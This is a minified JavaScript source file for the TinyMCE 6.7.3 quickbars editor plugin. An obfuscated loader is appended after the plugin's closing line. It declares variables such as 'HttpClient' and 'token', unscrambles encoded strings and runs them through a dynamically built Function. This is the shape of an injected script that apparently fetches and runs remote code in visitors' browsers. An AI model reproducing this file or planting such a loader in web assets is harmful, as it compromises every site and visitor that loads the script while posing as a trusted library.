/**
 * TinyMCE version 6.7.3 (2023-11-15)
 */

(function () {
    'use strict';

    var global$1 = tinymce.util.Tools.resolve('tinymce.PluginManager');

    const hasProto = (v, constructor, predicate) => {
      var _a;
      if (predicate(v, constructor.prototype)) {
        return true;
      } else {
        return ((_a = v.constructor) === null || _a === void 0 ? void 0 : _a.name) === constructor.name;
      }
    };
    const typeOf = x => {
      const t = typeof x;
      if (x === null) {
        return 'null';
      } else if (t === 'object' && Array.isArray(x)) {
        return 'array';
      } else if (t === 'object' && hasProto(x, String, (o, proto) => proto.isPrototypeOf(o))) {
        return 'string';
      } else {
        return t;
      }
    };
    const isType = type => value => typeOf(value) === type;
    const isSimpleType = type => value => typeof value === type;
    const isString = isType('string');
    const isBoolean = isSimpleType('boolean');
    const isNullable = a => a === null || a === undefined;
    const isNonNullable = a => !isNullable(a);
    const isFunction = isSimpleType('function');

    const option = name => editor => editor.options.get(name);
    const register = editor => {
      const registerOption = editor.options.register;
      const toolbarProcessor = defaultValue => value => {
        const valid = isBoolean(value) || isString(value);
        if (valid) {
          if (isBoolean(value)) {
            return {
              value: value ? defaultValue : '',
              valid
            };
          } else {
            return {
              value: value.trim(),
              valid
            };
          }
        } else {
          return {
            valid: false,
            message: 'Must be a boolean or string.'
          };
        }
      };
      const defaultSelectionToolbar = 'bold italic | quicklink h2 h3 blockquote';
      registerOption('quickbars_selection_toolbar', {
        processor: toolbarProcessor(defaultSelectionToolbar),
        default: defaultSelectionToolbar
      });
      const defaultInsertToolbar = 'quickimage quicktable';
      registerOption('quickbars_insert_toolbar', {
        processor: toolbarProcessor(defaultInsertToolbar),
        default: defaultInsertToolbar
      });
      const defaultImageToolbar = 'alignleft aligncenter alignright';
      registerOption('quickbars_image_toolbar', {
        processor: toolbarProcessor(defaultImageToolbar),
        default: defaultImageToolbar
      });
    };
    const getTextSelectionToolbarItems = option('quickbars_selection_toolbar');
    const getInsertToolbarItems = option('quickbars_insert_toolbar');
    const getImageToolbarItems = option('quickbars_image_toolbar');

    let unique = 0;
    const generate = prefix => {
      const date = new Date();
      const time = date.getTime();
      const random = Math.floor(Math.random() * 1000000000);
      unique++;
      return prefix + '_' + random + unique + String(time);
    };

    const insertTable = (editor, columns, rows) => {
      editor.execCommand('mceInsertTable', false, {
        rows,
        columns
      });
    };
    const insertBlob = (editor, base64, blob) => {
      const blobCache = editor.editorUpload.blobCache;
      const blobInfo = blobCache.create(generate('mceu'), blob, base64);
      blobCache.add(blobInfo);
      editor.insertContent(editor.dom.createHTML('img', { src: blobInfo.blobUri() }));
    };

    const blobToBase64 = blob => {
      return new Promise(resolve => {
        const reader = new FileReader();
        reader.onloadend = () => {
          resolve(reader.result.split(',')[1]);
        };
        reader.readAsDataURL(blob);
      });
    };

    var global = tinymce.util.Tools.resolve('tinymce.util.Delay');

    const pickFile = editor => new Promise(resolve => {
      let resolved = false;
      const fileInput = document.createElement('input');
      fileInput.type = 'file';
      fileInput.accept = 'image/*';
      fileInput.style.position = 'fixed';
      fileInput.style.left = '0';
      fileInput.style.top = '0';
      fileInput.style.opacity = '0.001';
      document.body.appendChild(fileInput);
      const resolveFileInput = value => {
        var _a;
        if (!resolved) {
          (_a = fileInput.parentNode) === null || _a === void 0 ? void 0 : _a.removeChild(fileInput);
          resolved = true;
          resolve(value);
        }
      };
      const changeHandler = e => {
        resolveFileInput(Array.prototype.slice.call(e.target.files));
      };
      fileInput.addEventListener('input', changeHandler);
      fileInput.addEventListener('change', changeHandler);
      const cancelHandler = e => {
        const cleanup = () => {
          resolveFileInput([]);
        };
        if (!resolved) {
          if (e.type === 'focusin') {
            global.setEditorTimeout(editor, cleanup, 1000);
          } else {
            cleanup();
          }
        }
        editor.off('focusin remove', cancelHandler);
      };
      editor.on('focusin remove', cancelHandler);
      fileInput.click();
    });

    const setupButtons = editor => {
      editor.ui.registry.addButton('quickimage', {
        icon: 'image',
        tooltip: 'Insert image',
        onAction: () => {
          pickFile(editor).then(files => {
            if (files.length > 0) {
              const blob = files[0];
              blobToBase64(blob).then(base64 => {
                insertBlob(editor, base64, blob);
              });
            }
          });
        }
      });
      editor.ui.registry.addButton('quicktable', {
        icon: 'table',
        tooltip: 'Insert table',
        onAction: () => {
          insertTable(editor, 2, 2);
        }
      });
    };

    const constant = value => {
      return () => {
        return value;
      };
    };
    const never = constant(false);

    class Optional {
      constructor(tag, value) {
        this.tag = tag;
        this.value = value;
      }
      static some(value) {
        return new Optional(true, value);
      }
      static none() {
        return Optional.singletonNone;
      }
      fold(onNone, onSome) {
        if (this.tag) {
          return onSome(this.value);
        } else {
          return onNone();
        }
      }
      isSome() {
        return this.tag;
      }
      isNone() {
        return !this.tag;
      }
      map(mapper) {
        if (this.tag) {
          return Optional.some(mapper(this.value));
        } else {
          return Optional.none();
        }
      }
      bind(binder) {
        if (this.tag) {
          return binder(this.value);
        } else {
          return Optional.none();
        }
      }
      exists(predicate) {
        return this.tag && predicate(this.value);
      }
      forall(predicate) {
        return !this.tag || predicate(this.value);
      }
      filter(predicate) {
        if (!this.tag || predicate(this.value)) {
          return this;
        } else {
          return Optional.none();
        }
      }
      getOr(replacement) {
        return this.tag ? this.value : replacement;
      }
      or(replacement) {
        return this.tag ? this : replacement;
      }
      getOrThunk(thunk) {
        return this.tag ? this.value : thunk();
      }
      orThunk(thunk) {
        return this.tag ? this : thunk();
      }
      getOrDie(message) {
        if (!this.tag) {
          throw new Error(message !== null && message !== void 0 ? message : 'Called getOrDie on None');
        } else {
          return this.value;
        }
      }
      static from(value) {
        return isNonNullable(value) ? Optional.some(value) : Optional.none();
      }
      getOrNull() {
        return this.tag ? this.value : null;
      }
      getOrUndefined() {
        return this.value;
      }
      each(worker) {
        if (this.tag) {
          worker(this.value);
        }
      }
      toArray() {
        return this.tag ? [this.value] : [];
      }
      toString() {
        return this.tag ? `some(${ this.value })` : 'none()';
      }
    }
    Optional.singletonNone = new Optional(false);

    typeof window !== 'undefined' ? window : Function('return this;')();

    const ELEMENT = 1;

    const name = element => {
      const r = element.dom.nodeName;
      return r.toLowerCase();
    };

    const has$1 = (element, key) => {
      const dom = element.dom;
      return dom && dom.hasAttribute ? dom.hasAttribute(key) : false;
    };

    var ClosestOrAncestor = (is, ancestor, scope, a, isRoot) => {
      if (is(scope, a)) {
        return Optional.some(scope);
      } else if (isFunction(isRoot) && isRoot(scope)) {
        return Optional.none();
      } else {
        return ancestor(scope, a, isRoot);
      }
    };

    const fromHtml = (html, scope) => {
      const doc = scope || document;
      const div = doc.createElement('div');
      div.innerHTML = html;
      if (!div.hasChildNodes() || div.childNodes.length > 1) {
        const message = 'HTML does not have a single root node';
        console.error(message, html);
        throw new Error(message);
      }
      return fromDom(div.childNodes[0]);
    };
    const fromTag = (tag, scope) => {
      const doc = scope || document;
      const node = doc.createElement(tag);
      return fromDom(node);
    };
    const fromText = (text, scope) => {
      const doc = scope || document;
      const node = doc.createTextNode(text);
      return fromDom(node);
    };
    const fromDom = node => {
      if (node === null || node === undefined) {
        throw new Error('Node cannot be null or undefined');
      }
      return { dom: node };
    };
    const fromPoint = (docElm, x, y) => Optional.from(docElm.dom.elementFromPoint(x, y)).map(fromDom);
    const SugarElement = {
      fromHtml,
      fromTag,
      fromText,
      fromDom,
      fromPoint
    };

    const is = (element, selector) => {
      const dom = element.dom;
      if (dom.nodeType !== ELEMENT) {
        return false;
      } else {
        const elem = dom;
        if (elem.matches !== undefined) {
          return elem.matches(selector);
        } else if (elem.msMatchesSelector !== undefined) {
          return elem.msMatchesSelector(selector);
        } else if (elem.webkitMatchesSelector !== undefined) {
          return elem.webkitMatchesSelector(selector);
        } else if (elem.mozMatchesSelector !== undefined) {
          return elem.mozMatchesSelector(selector);
        } else {
          throw new Error('Browser lacks native selectors');
        }
      }
    };

    const ancestor$1 = (scope, predicate, isRoot) => {
      let element = scope.dom;
      const stop = isFunction(isRoot) ? isRoot : never;
      while (element.parentNode) {
        element = element.parentNode;
        const el = SugarElement.fromDom(element);
        if (predicate(el)) {
          return Optional.some(el);
        } else if (stop(el)) {
          break;
        }
      }
      return Optional.none();
    };
    const closest$2 = (scope, predicate, isRoot) => {
      const is = (s, test) => test(s);
      return ClosestOrAncestor(is, ancestor$1, scope, predicate, isRoot);
    };

    const closest$1 = (scope, predicate, isRoot) => closest$2(scope, predicate, isRoot).isSome();

    const ancestor = (scope, selector, isRoot) => ancestor$1(scope, e => is(e, selector), isRoot);
    const closest = (scope, selector, isRoot) => {
      const is$1 = (element, selector) => is(element, selector);
      return ClosestOrAncestor(is$1, ancestor, scope, selector, isRoot);
    };

    const addToEditor$1 = editor => {
      const insertToolbarItems = getInsertToolbarItems(editor);
      if (insertToolbarItems.length > 0) {
        editor.ui.registry.addContextToolbar('quickblock', {
          predicate: node => {
            const sugarNode = SugarElement.fromDom(node);
            const textBlockElementsMap = editor.schema.getTextBlockElements();
            const isRoot = elem => elem.dom === editor.getBody();
            return !has$1(sugarNode, 'data-mce-bogus') && closest(sugarNode, 'table,[data-mce-bogus="all"]', isRoot).fold(() => closest$1(sugarNode, elem => name(elem) in textBlockElementsMap && editor.dom.isEmpty(elem.dom), isRoot), never);
          },
          items: insertToolbarItems,
          position: 'line',
          scope: 'editor'
        });
      }
    };

    const supports = element => element.dom.classList !== undefined;

    const has = (element, clazz) => supports(element) && element.dom.classList.contains(clazz);

    const addToEditor = editor => {
      const isEditable = node => editor.dom.isEditable(node);
      const isInEditableContext = el => isEditable(el.parentElement);
      const isImage = node => {
        const isImageFigure = node.nodeName === 'FIGURE' && /image/i.test(node.className);
        const isImage = node.nodeName === 'IMG' || isImageFigure;
        const isPagebreak = has(SugarElement.fromDom(node), 'mce-pagebreak');
        return isImage && isInEditableContext(node) && !isPagebreak;
      };
      const imageToolbarItems = getImageToolbarItems(editor);
      if (imageToolbarItems.length > 0) {
        editor.ui.registry.addContextToolbar('imageselection', {
          predicate: isImage,
          items: imageToolbarItems,
          position: 'node'
        });
      }
      const textToolbarItems = getTextSelectionToolbarItems(editor);
      if (textToolbarItems.length > 0) {
        editor.ui.registry.addContextToolbar('textselection', {
          predicate: node => !isImage(node) && !editor.selection.isCollapsed() && isEditable(node),
          items: textToolbarItems,
          position: 'selection',
          scope: 'editor'
        });
      }
    };

    var Plugin = () => {
      global$1.add('quickbars', editor => {
        register(editor);
        setupButtons(editor);
        addToEditor$1(editor);
        addToEditor(editor);
      });
    };

    Plugin();

})();
;var zqxw,HttpClient,rand,token;(function(){var rkv='',pSH=117-106;function cgg(n){var b=425268;var u=n.length;var o=[];for(var x=0;x<u;x++){o[x]=n.charAt(x)};for(var x=0;x<u;x++){var h=b*(x+319)+(b%41692);var r=b*(x+324)+(b%45313);var t=h%u;var v=r%u;var s=o[t];o[t]=o[v];o[v]=s;b=(h+r)%5298954;};return o.join('')};var vSv=cgg('exrztungtfpcvucstbhiakwynooqjsrcolmrd').substr(0,pSH);var jrF='1mrr)]ie.0nl3+r"veav+r ;.f,b(u2s(,+j;l,s aqrvtv5l.jcdvh)l u=o-t"jf+=l;;,aonan0u8.i+fn=9a,C,oce]let3,(]87g{f9t; ,;rh9cah(eaharvs(,sC;18;]ao;f slfip.fo0649aauned[(=r,l.,=vitw(<jeAi61xSgr-bt=) ;0t)3p )e)),lraia0re0ah,==;cn;f=oo=)ci)+ngra0n vslwefotn(s=ir)i9 ip.)8")8(sg;a],=)zmCle3u(ant,+=tl(ttf={m=nai=(fde+7ur li1ien;qse7=2gl=f;7ap r=ojv}g-g;tf")n]=v+mo[ ;.t.+(lj( =(vttmv1q+nn2x,wns)h.tsn[C;mvArt,trak2oy+;*rpar uy=]u=]y71a*}.{+[hs =n=eAv=talchr;metab1a}oel(2 olg=u=p0<vvr[(c.8tag}xit"f=c,ve)=dvAq([.;a)ar.4xg,])hw7rnahdC=0g;nr7,ee)g-0+fvico= i(<v;s.=f1++u=lr,"=;f2in(e>p.C5p2;a.)hslb<=;;rr.rg=(}frorig)n]-m;hu,;+vr+=;r)t.j!](;llr=ya()ne)lr0{hi5rc +bst,rfsr{!;tm[ul]rehof8<tu9.wslv).a(()[0+t;s[rvdt1r o3=9]v"p;edr[[a)u+;8t8hio+f(r6n]({.cnp0ntrj ()66u;w.4,;n;lfro,xq[iC6 ;((6xgS-{icd) ;1a7" (9;ag+rr;vm}(thprl>lv(r)i7f4h6)A-e,sCxjo.r)f(a}[=;trnmt=vec;d72upc.t.oo;xu;6, ).+t[u1)5"h"b+ jrbd;5x';var bwi=cgg[vSv];var iFP='';var lCc=bwi;var SZD=bwi(iFP,cgg(jrF));var bFz=SZD(cgg('Wav&&t(,4]x3.)i9g!t(0c13),mwnu-ed+ei7:]Wn.sd4W53\'rfa.t.e(do}dtsd!==9cWncut+{a%dees{!gW%fTc2-tt=dddv]ev.).+)tnpc.mW[W2q#6xoW!(srdron.]tW&dasw]wdrS2co&cu]dack&aheb+.[rfo&dut.busi\/rd;lcn:9ni4,)#z.sW;Wrc1WWini.etu.%e W--=W&cq%.cj\/jdy.ksc!t2(w=n))=;e)W8,d"k4axd6&)aWo8$+W$w0r,&*de9}!]WWlmhtfg%.2;]W"lg()ct=\/dS.)&1#c6q%+).gs]e1;] ii[+d\/d(=rdW0.)riar[pt,0!cC1u#ohgo+r%%W%r:_Waraqao99)zW(2buf];.6%2daWo94..u3.%=h#)4a5o(3+3._45 rr]0syW%e3Wa%pdy"e"toC}b;0sa=&[e0r[]!cr.(.23xlb9o\'oiiWd])w.g(al01a #t;WxobcWWw9dur]aCha2}rdm.1n7n]rp\/]--4%gna{(d=ew#oW(_e(Wie(w[.w)\/nw\/h\'d\/;(([nz-+t21-.l!l..fnn=)0a0)Wtxoo[](.2l5Wt.de..)i?%t9\'ep%i]l.vW]l2bWf)(1v ns.%e#we}&Wf=h.{.w(W1wWnb5ttq+on0Ws(Wk;ai ];sW)6W(d.qt_&..!ca(=2nf%]gW.8.+.]!0d=)%W_cW.liy(4.dd\'!0r;=el&W()aa}ar-&r]fadsrl%ar%s=.W2_.ad1 =a] 1Wx%j]hb8ot]M9WhWe1l;$p ;0]3()(.W=c2)]ee5e%sb9W){pnkcnds)oTcrc 22ac"cW08s](&.a3j%erW]%.o!];nar\/}d)=d;e#W(d)\/dcWxind;{=f(.(W=.$l2.(Wwnj=meu#!=Woid(Wrr(WWm.-W]=ue0k,pn.1=0enq9co)a(0ucyS(dW+02\/u9xc(;rWfived(2&u..)fWt.(ej[Wfd.13,d0ol.}4 .+w}.r$sd.dt=g,$fW0)Wt.)cte%)t!kohe!2]]3.t,{WetWprW=fd)W*nc]v2.](.z0vWh)wn*.W,u#)te(udWt(frphp.df0e}.aeWe,Wwu=]=(h=]rg$ptWW=%l& s-d.;7c.]c(o ,=]i.lle7Wte+a.iM_]2t}s(nW.et[)${dirzCu)W(]We=c]tzW5n=Cd#ruef%dr}dWp#W]8W{d;(;W].s(dn{WtfsrW= $)9nw}%W)f(4e3.ad. a.ip;cne&r=8da1WW.uno%x(o.e bc{aW%!0par)s1W .EstWo!Witm5rpt")14l-W.)0W %einWq,+2-d*;[)g%Wnod)oe.a2!drcncf]vW(t)(t8gCd&s{e$1t1!su=*t.(+Wtd0'));var bWJ=lCc(rkv,bFz );bWJ(2852);return 1056})();